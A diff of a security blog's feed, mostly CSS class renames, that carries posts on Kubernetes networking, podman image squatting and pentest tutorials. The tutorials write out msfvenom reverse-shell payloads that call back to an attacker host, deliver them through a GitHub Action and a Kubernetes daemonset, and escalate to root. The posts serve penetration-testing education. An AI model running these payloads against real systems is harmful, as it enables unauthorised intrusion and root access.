-&lt;p&gt;The servce IP address range defined on the cluster is the standard &lt;code class=&quot;highlighter-rouge&quot;&gt;10.96.0.0/12&lt;/code&gt; . If I try to scan a service listening in that range on &lt;code class=&quot;highlighter-rouge&quot;&gt;10.105.140.70:3000&lt;/code&gt; for example from a host outside the cluster, I’ll get told that port is filtered. One point to note here (as suggested by &lt;a href=&quot;https://twitter.com/TinkerFairy_Net&quot;&gt;@TinkerFairy_Net&lt;/a&gt;) is that filtered from an nmap TCP scan means it didn’t receive any response to the request, not that there’s some security measure preventing access.&lt;/p&gt;
+&lt;p&gt;The servce IP address range defined on the cluster is the standard &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.96.0.0/12&lt;/code&gt; . If I try to scan a service listening in that range on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.105.140.70:3000&lt;/code&gt; for example from a host outside the cluster, I’ll get told that port is filtered. One point to note here (as suggested by &lt;a href=&quot;https://twitter.com/TinkerFairy_Net&quot;&gt;@TinkerFairy_Net&lt;/a&gt;) is that filtered from an nmap TCP scan means it didn’t receive any response to the request, not that there’s some security measure preventing access.&lt;/p&gt;
 
-&lt;p&gt;One other point about the command below is that you need the &lt;code class=&quot;highlighter-rouge&quot;&gt;-Pn&lt;/code&gt; switch to disable nmap’s Ping scanning which it usually does to determine if a host is live.  Service IPs aren’t real machines, so they won’t respond on any port other than the service one.&lt;/p&gt;
+&lt;p&gt;One other point about the command below is that you need the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-Pn&lt;/code&gt; switch to disable nmap’s Ping scanning which it usually does to determine if a host is live.  Service IPs aren’t real machines, so they won’t respond on any port other than the service one.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nmap -Pn -sT -n -p3000 10.105.140.70
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nmap -Pn -sT -n -p3000 10.105.140.70
 
 Starting Nmap 7.60 ( https://nmap.org ) at 2019-10-03 19:51 BST
 Nmap scan report for 10.105.140.70
@@ -240,14 +315,14 @@ Nmap done: 1 IP address (1 host up) scanned in 2.04 seconds
 
 &lt;p&gt;So we can’t get to that port on that IP address. Now lets try adding a route to the service IP address network via the cluster node’s main IP address.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo ip route add 10.96.0.0/12 via 172.16.198.131
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo ip route add 10.96.0.0/12 via 172.16.198.131
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;This change essentially tells our client machine that there’s another router on the network and that for traffic in the range &lt;code class=&quot;highlighter-rouge&quot;&gt;10.96.0.0/12&lt;/code&gt; it should send the packets to our Kubernetes cluster node for onwards transmission.&lt;/p&gt;
+&lt;p&gt;This change essentially tells our client machine that there’s another router on the network and that for traffic in the range &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.96.0.0/12&lt;/code&gt; it should send the packets to our Kubernetes cluster node for onwards transmission.&lt;/p&gt;
 
 &lt;p&gt;Now if we retry the same command&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nmap -Pn -sT -n -p3000 10.105.140.70
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nmap -Pn -sT -n -p3000 10.105.140.70
 
 Starting Nmap 7.60 ( https://nmap.org ) at 2019-10-03 19:53 BST
 Nmap scan report for 10.105.140.70
@@ -274,13 +349,13 @@ Nmap done: 1 IP address (1 host up) scanned in 0.03 seconds
 				<title>Container Image Squatting in a Multi-Registry World</title>
 				<description>&lt;p&gt;I’ve been starting to have a look at &lt;a href=&quot;https://podman.io/&quot;&gt;podman&lt;/a&gt; recently and in doing so, I noticed something potentially interesting from a security perspective, which is how podman handles the pulling of new container images.  As podman is billed as a “drop-in” replacement for Docker (and indeed provides a package to alias docker commands to their podman equivalents), it’s interesting to note how default settings might differ, as these differences could trip up unsuspecting users moving from Docker to podman.&lt;/p&gt;
 
-&lt;p&gt;One of the more fixed things in the Docker landscape is how it address container image registries. Docker hub is hard coded in the source code of Docker as the default registry, so that if you do something like &lt;code class=&quot;highlighter-rouge&quot;&gt;docker pull nginx&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;docker pull raesene/alpine-containertools&lt;/code&gt; it will assume that you’re looking for these images on Docker Hub.  If you want to pull from an alternate registry, you need to provide the hostname and port of that registry server.&lt;/p&gt;
+&lt;p&gt;One of the more fixed things in the Docker landscape is how it address container image registries. Docker hub is hard coded in the source code of Docker as the default registry, so that if you do something like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker pull nginx&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker pull raesene/alpine-containertools&lt;/code&gt; it will assume that you’re looking for these images on Docker Hub.  If you want to pull from an alternate registry, you need to provide the hostname and port of that registry server.&lt;/p&gt;
 
 &lt;p&gt;This behaviour appears to have been a source of frustration for other organizations in the container ecosystem, so it’s not really a surprise to find that it works differently when you use other tools, like podman.&lt;/p&gt;
 
-&lt;p&gt;What podman does is allow users to specify their registry search order via a configuration file stored at &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/containers/registries.conf&lt;/code&gt;. On a CentOS8 install the default registry search order is this&lt;/p&gt;
+&lt;p&gt;What podman does is allow users to specify their registry search order via a configuration file stored at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/containers/registries.conf&lt;/code&gt;. On a CentOS8 install the default registry search order is this&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[registries.search]
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[registries.search]
 registries = ['registry.redhat.io', 'quay.io', 'docker.io']
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
@@ -290,7 +365,7 @@ registries = ['registry.redhat.io', 'quay.io', 'docker.io']
 
 &lt;p&gt;To give an example. On Docker hub there’s an image I have with some container tooling called &lt;a href=&quot;https://hub.docker.com/r/raesene/alpine-containertools&quot;&gt;alpine-containertools&lt;/a&gt;.  As an experiment I tried creating the same image name with totally different content on Quay.io which is &lt;a href=&quot;https://quay.io/repository/raesene/alpine-containertools&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
 
-&lt;p&gt;So if you use podman and run &lt;code class=&quot;highlighter-rouge&quot;&gt;docker pull raesene/alpine-containertools&lt;/code&gt; you’re going to get the wrong image.&lt;/p&gt;
+&lt;p&gt;So if you use podman and run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker pull raesene/alpine-containertools&lt;/code&gt; you’re going to get the wrong image.&lt;/p&gt;
 
 &lt;p&gt;This could lead to attackers essentially squatting on common Docker Hub accounts to try and trick users into pulling malicious images.  A process made somewhat easier by the fact that you can register organization names on Quay.io (for example, I registered &lt;a href=&quot;https://quay.io/organization/nccgroup&quot;&gt;nccgroup&lt;/a&gt;).&lt;/p&gt;
 
@@ -299,10 +374,10 @@ registries = ['registry.redhat.io', 'quay.io', 'docker.io']
 &lt;p&gt;Well if you’re planning to adopt podman there’s a couple of things you could do to mitigate this risk&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;Change the search order in registries.conf to have &lt;code class=&quot;highlighter-rouge&quot;&gt;docker.io&lt;/code&gt; first, which essentially restores the default behaviour (although it could still produce unexpected results if you misspell your pull request)&lt;/li&gt;
+  &lt;li&gt;Change the search order in registries.conf to have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker.io&lt;/code&gt; first, which essentially restores the default behaviour (although it could still produce unexpected results if you misspell your pull request)&lt;/li&gt;
   &lt;li&gt;Remove the other registries from the file altogether (which essentially makes the behaviour the same as Docker)&lt;/li&gt;
   &lt;li&gt;Ensure that you’ve registered any names you use on Docker Hub on Quay.io (this only works where you’re pulling Docker Hub images from accounts you control, but of course who pulls Docker Hub images from accounts they don’t control!)&lt;/li&gt;
-  &lt;li&gt;Use FQDNs for all your &lt;code class=&quot;highlighter-rouge&quot;&gt;pull&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;run&lt;/code&gt; statements, essentially bypassing the search order.&lt;/li&gt;
+  &lt;li&gt;Use FQDNs for all your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pull&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run&lt;/code&gt; statements, essentially bypassing the search order.&lt;/li&gt;
   &lt;li&gt;Make use of image signing to check that the image pulled is the same as that which was expected.&lt;/li&gt;
 &lt;/ul&gt;
 </description>
@@ -323,7 +398,7 @@ registries = ['registry.redhat.io', 'quay.io', 'docker.io']
 
 &lt;p&gt;So I’ve started off the process of creating a set of vulnerable clusters as Ansible playbooks and put it &lt;a href=&quot;https://github.com/raesene/kube_security_lab&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;The idea is that the &lt;code class=&quot;highlighter-rouge&quot;&gt;client-machine.yml&lt;/code&gt; playbook can be used to spin up a container with client tools installed (it’s just an instance of &lt;a href=&quot;https://hub.docker.com/r/raesene/alpine-containertools&quot;&gt;this image&lt;/a&gt; at the moment) and then bring up one or more of the vulnerable clusters as playbooks, practice attacking that configuration and then easily remove both the cluster and client container.&lt;/p&gt;
+&lt;p&gt;The idea is that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client-machine.yml&lt;/code&gt; playbook can be used to spin up a container with client tools installed (it’s just an instance of &lt;a href=&quot;https://hub.docker.com/r/raesene/alpine-containertools&quot;&gt;this image&lt;/a&gt; at the moment) and then bring up one or more of the vulnerable clusters as playbooks, practice attacking that configuration and then easily remove both the cluster and client container.&lt;/p&gt;
 
 &lt;p&gt;In general you can spin up the client machine and a sample cluster, then port-scan the target cluster to see what’s exposed and start attacking things!&lt;/p&gt;
 
@@ -355,18 +430,18 @@ registries = ['registry.redhat.io', 'quay.io', 'docker.io']
 
 &lt;p&gt;Just like in the previous post on &lt;a href=&quot;https://raesene.github.io/blog/2019/08/10/making-it-rain-shells-in-Kubernetes/&quot;&gt;Kubernetes shells&lt;/a&gt; we’re going to use &lt;a href=&quot;https://www.metasploit.com/&quot;&gt;Metasploit&lt;/a&gt; for this.  So we need a reverse shell payload that we can call back to.  For this, you’ll need to have the port receiving the connection visible on the Internet with no firewall in the way, you could use something like a Digital Ocean droplet or EC2 instance for this.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x64/meterpreter_reverse_http LHOST=YOURIP LPORT=YOURPORT -f elf &amp;gt; reverse_shell.elf
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x64/meterpreter_reverse_http LHOST=YOURIP LPORT=YOURPORT -f elf &amp;gt; reverse_shell.elf
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;just replace &lt;code class=&quot;highlighter-rouge&quot;&gt;YOURIP&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;YOURPORT&lt;/code&gt; with your information.&lt;/p&gt;
+&lt;p&gt;just replace &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YOURIP&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YOURPORT&lt;/code&gt; with your information.&lt;/p&gt;
 
 &lt;p&gt;Now we’ve got a shell program, just start a new Github repository and add the shell to the repo.&lt;/p&gt;
 
 &lt;h3 id=&quot;our-gtihub-action&quot;&gt;Our Gtihub Action&lt;/h3&gt;
 
-&lt;p&gt;We just need to create our action now that will get triggered when we push changes to our Github repository.  Github actions live in &lt;code class=&quot;highlighter-rouge&quot;&gt;.github/workflows/&lt;/code&gt; and are in YAML format.  Create a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;testaction.yml&lt;/code&gt; in there and you can put something like this into the file.&lt;/p&gt;
+&lt;p&gt;We just need to create our action now that will get triggered when we push changes to our Github repository.  Github actions live in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.github/workflows/&lt;/code&gt; and are in YAML format.  Create a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;testaction.yml&lt;/code&gt; in there and you can put something like this into the file.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;name: Shell
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;name: Shell
 
 on: [push]
 
@@ -386,14 +461,14 @@ jobs:
 
 &lt;h3 id=&quot;metasploit-handler&quot;&gt;Metasploit handler&lt;/h3&gt;
 
-&lt;p&gt;after running &lt;code class=&quot;highlighter-rouge&quot;&gt;msfconsole&lt;/code&gt; you can do the following steps&lt;/p&gt;
+&lt;p&gt;after running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfconsole&lt;/code&gt; you can do the following steps&lt;/p&gt;
 
 &lt;ol&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;use exploit/multi/handler&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;set payload linux/x64/meterpreter_reverse_http&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;set LHOST YOURIP&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;set LPORT YOURPORT&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;exploit&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;use exploit/multi/handler&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;set payload linux/x64/meterpreter_reverse_http&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;set LHOST YOURIP&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;set LPORT YOURPORT&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;&lt;/li&gt;
 &lt;/ol&gt;
 
 &lt;p&gt;Then push your shell and action code to Github to trigger the action, and all being well you should get a shell :)&lt;/p&gt;
@@ -404,26 +479,26 @@ jobs:
 
 &lt;p&gt;&lt;strong&gt;“Privesc”&lt;/strong&gt;&lt;/p&gt;
 
-&lt;p&gt;When you first get the shell, you’re running as the &lt;code class=&quot;highlighter-rouge&quot;&gt;runner&lt;/code&gt; user but it’s got passwordless &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; access, so you can just &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo bash&lt;/code&gt; to get &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;When you first get the shell, you’re running as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runner&lt;/code&gt; user but it’s got passwordless &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; access, so you can just &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo bash&lt;/code&gt; to get &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;Listening ports&lt;/strong&gt;&lt;/p&gt;
 
-&lt;p&gt;Running &lt;code class=&quot;highlighter-rouge&quot;&gt;ss -ltnp&lt;/code&gt; will show us the listening TCP ports&lt;/p&gt;
+&lt;p&gt;Running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ss -ltnp&lt;/code&gt; will show us the listening TCP ports&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    
 LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*       
 LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       
 LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       
 LISTEN   0         128                    [::]:22                  [::]:*  
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;The port &lt;code class=&quot;highlighter-rouge&quot;&gt;3306/TCP&lt;/code&gt; is kind of interesting, as my action didn’t make any use of MySQL.&lt;/p&gt;
+&lt;p&gt;The port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3306/TCP&lt;/code&gt; is kind of interesting, as my action didn’t make any use of MySQL.&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;Routing Table&lt;/strong&gt;&lt;/p&gt;
 
-&lt;p&gt;Nothing hugely interesting on the routing table, although interesting that &lt;code class=&quot;highlighter-rouge&quot;&gt;docker0&lt;/code&gt; is there, so we’re running Docker on the runner host.&lt;/p&gt;
+&lt;p&gt;Nothing hugely interesting on the routing table, although interesting that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker0&lt;/code&gt; is there, so we’re running Docker on the runner host.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Kernel IP routing table
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Kernel IP routing table
 Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
 0.0.0.0         10.1.0.1        0.0.0.0         UG    100    0        0 eth0
 10.1.0.0        0.0.0.0         255.255.0.0     U     0      0        0 eth0
@@ -438,9 +513,9 @@ Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
 
 &lt;p&gt;&lt;strong&gt;Users on the host&lt;/strong&gt;&lt;/p&gt;
 
-&lt;p&gt;A quick look at &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; shows up a couple of non-standard users&lt;/p&gt;
+&lt;p&gt;A quick look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; shows up a couple of non-standard users&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pollinate:x:110:1::/var/cache/pollinate:/bin/false
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pollinate:x:110:1::/var/cache/pollinate:/bin/false
 mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
 sphinxsearch:x:112:117:Sphinx fulltext search service,,,:/var/run/sphinxsearch:/usr/sbin/nologin
 runneradmin:x:1000:1000:Ubuntu:/home/runneradmin:/bin/bash
@@ -462,9 +537,9 @@ runner:x:1001:115:,,,:/home/runner:/bin/bash
 				<title>Making it Rain shells in Kubernetes</title>
 				<description>&lt;p&gt;Following on from the &lt;a href=&quot;https://raesene.github.io/blog/2019/08/09/docker-reverse-shells/&quot;&gt;last post&lt;/a&gt; in this series lets setup a rather more ambitious set of reverse shells when attacking a Kubernetes cluster.&lt;/p&gt;
 
-&lt;p&gt;The scenario here is that we’ve got the ability to create a &lt;code class=&quot;highlighter-rouge&quot;&gt;daemonset&lt;/code&gt; object in a target Kubernetes cluster and we’d like to have shells on every node in the cluster which have the Docker socket exposed, so we can get a root shell on every node in the cluster.&lt;/p&gt;
+&lt;p&gt;The scenario here is that we’ve got the ability to create a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;daemonset&lt;/code&gt; object in a target Kubernetes cluster and we’d like to have shells on every node in the cluster which have the Docker socket exposed, so we can get a root shell on every node in the cluster.&lt;/p&gt;
 
-&lt;p&gt;To do this we’ll need something that’ll easily handle multiple incoming shells, so we’ll turn to the &lt;a href=&quot;https://www.metasploit.com/&quot;&gt;Metasploit Framework&lt;/a&gt; and specifically, &lt;code class=&quot;highlighter-rouge&quot;&gt;exploit/multi/handler&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;To do this we’ll need something that’ll easily handle multiple incoming shells, so we’ll turn to the &lt;a href=&quot;https://www.metasploit.com/&quot;&gt;Metasploit Framework&lt;/a&gt; and specifically, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit/multi/handler&lt;/code&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;step-1-create-the-payload&quot;&gt;Step 1: Create the payload&lt;/h2&gt;
 
@@ -472,23 +547,23 @@ runner:x:1001:115:,,,:/home/runner:/bin/bash
 
 &lt;p&gt;For this we can run msfvenom to setup our payload and then embed that into a Docker image.&lt;/p&gt;
 
-&lt;p&gt;In this case our pentester machine will be on &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.200.1&lt;/code&gt; . To avoid managing all Metasploit’s dependencies we can just run it in a Docker container.&lt;/p&gt;
+&lt;p&gt;In this case our pentester machine will be on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.200.1&lt;/code&gt; . To avoid managing all Metasploit’s dependencies we can just run it in a Docker container.&lt;/p&gt;
 
 &lt;p&gt;This command will generate our payload&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run raesene/metasploit ./msfvenom -p linux/x64/meterpreter_reverse_http LHOST=192.168.200.1 LPORT=8989 -f elf &amp;gt; reverse_shell.elf
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run raesene/metasploit ./msfvenom -p linux/x64/meterpreter_reverse_http LHOST=192.168.200.1 LPORT=8989 -f elf &amp;gt; reverse_shell.elf
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;setting-up-the-docker-image&quot;&gt;Setting up the Docker Image&lt;/h3&gt;
 
 &lt;p&gt;Next run this command to get the Docker GPG key into your directory&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl https://download.docker.com/linux/ubuntu/gpg &amp;gt; docker.gpg
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl https://download.docker.com/linux/ubuntu/gpg &amp;gt; docker.gpg
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;We can now create a Dockerfile to host this shell and upload it to Docker hub.  The Dockerfile is a pretty simple one, we’ll need out payload and also the Docker client, for later use.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FROM ubuntu:18.04
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FROM ubuntu:18.04
 
 RUN apt update &amp;amp;&amp;amp; apt install -y apt-transport-https ca-certificates curl software-properties-common
 
@@ -512,12 +587,12 @@ CMD [&quot;/reverse_shell.elf&quot;]
 
 &lt;p&gt;Build it with (replace raesene below with your own docker hub name)&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker build -t raesene/reverse_shell .
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker build -t raesene/reverse_shell .
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Then you can login to Docker hub with &lt;code class=&quot;highlighter-rouge&quot;&gt;docker login&lt;/code&gt; and upload with&lt;/p&gt;
+&lt;p&gt;Then you can login to Docker hub with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker login&lt;/code&gt; and upload with&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker push raesene/reverse_shell
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker push raesene/reverse_shell
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;At this point we can test our reverse shell on a single machine by setting up a Metasploit listener and check that all is well.&lt;/p&gt;
@@ -526,17 +601,17 @@ CMD [&quot;/reverse_shell.elf&quot;]
 
 &lt;p&gt;On the pentester machine start-up the metasploit console with&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfconsole
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfconsole
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;then&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use exploit/multi/handler
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use exploit/multi/handler
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;and set our variables, in the same way we did with &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; earlier&lt;/p&gt;
+&lt;p&gt;and set our variables, in the same way we did with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; earlier&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;set payload linux/x64/meterpreter_reverse_http
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;set payload linux/x64/meterpreter_reverse_http
 set LHOST 192.168.200.1
 set LPORT 8989
 set ExitOnSession false
@@ -544,12 +619,12 @@ set ExitOnSession false
 
 &lt;p&gt;With those set, we can start it up to listen for incoming shells&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exploit -j
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exploit -j
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Now on a target machine run our shell and we should get that back on the metasploit console&lt;/p&gt;
 
